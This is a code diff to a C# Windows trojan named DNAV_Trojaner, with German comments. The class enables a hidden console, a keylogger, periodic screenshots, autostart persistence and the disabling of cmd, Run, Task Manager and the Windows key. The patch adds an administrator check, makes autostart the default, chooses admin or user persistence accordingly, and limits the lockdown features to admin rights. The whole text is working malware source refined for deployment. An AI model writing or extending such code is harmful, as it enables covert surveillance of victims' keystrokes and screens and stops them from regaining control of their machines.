@@ -4,11 +4,14 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Threading;
+using System.Security.Principal;
 
 namespace DNAV_Trojaner
 {
     public class DNAV
     {
+        private bool _isAdmin;
+
         private bool _hide;
         private bool _keylogger;
         private string _keyloggerLogPath;
@@ -20,6 +23,13 @@ namespace DNAV_Trojaner
         private bool _disableRun;
         private bool _disableTaskmanager;
         private bool _disableWindowsKey;
+
+        private bool checkAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
 
         /// <summary>
         /// Legt fest, ob das Konsolenfenster versteckt wird.
@@ -191,9 +201,11 @@ namespace DNAV_Trojaner
         /// </summary>
         public DNAV()
         {
+            this._isAdmin = checkAdmin();
             this.Hide = false;
             this.Keylogger = false;
             this.KeyloggerLogPath = "log.txt";
+            this.Autostart = true;
             this.Screenshots = false;
             this.ScreenshotsPath = "screen.png";
             this.ScreenshotsInterval = 180;
@@ -207,11 +219,12 @@ namespace DNAV_Trojaner
         /// Erstellt ein Objekt der DNAV Klasse mit festgelegten Parametern.
         /// </summary>
         /// <param name="aggressive">Wenn gesetzt, sind alle Module aktiviert.</param>
-        public DNAV(bool aggressive)
+        public DNAV(bool aggressive) : this()
         {
             this.Hide = true;
             this.Keylogger = true;
             this.KeyloggerLogPath = "log.txt";
+            this.Autostart = true;
             this.Screenshots = aggressive;
             this.ScreenshotsPath = "screen.png";
             this.ScreenshotsInterval = 10;
@@ -232,12 +245,16 @@ namespace DNAV_Trojaner
             }
             if (this.Keylogger)
             {
-                Thread keylogger = new Thread(DNAV_Trojaner.Keylogger.Enable);
+                Thread keylogger = new Thread(() => DNAV_Trojaner.Keylogger.EnableWithLog(this.KeyloggerLogPath));
                 keylogger.Start();
             }
-            if (this.Autostart)
+            if (this.Autostart && this._isAdmin)
             {
                 Startup.EnableForAdmin();
+            }
+            if (this.Autostart && !this._isAdmin)
+            {
+                Startup.Enable();
             }
             if (this.Screenshots)
             {
@@ -245,19 +262,19 @@ namespace DNAV_Trojaner
                 Thread screenshot = new Thread(() => sc.CaptureScreenToFile(this.ScreenshotsPath, System.Drawing.Imaging.ImageFormat.Png, this.ScreenshotsInterval));
                 screenshot.Start();
             }
-            if (this.DisableCmd)
+            if (this.DisableCmd && this._isAdmin)
             {
                 Cmd.Disbable();
             }
-            if (this.DisableRun)
+            if (this.DisableRun && this._isAdmin)
             {
                 Run.Disbable(); 
             }
-            if (this.DisableTaskmanager)
+            if (this.DisableTaskmanager && this._isAdmin)
             {
                 Taskmanager.Disable();
             }
-            if (this.DisableWindowsKey)
+            if (this.DisableWindowsKey && this._isAdmin)
             {
                 WindowsKey.Disable();
             }
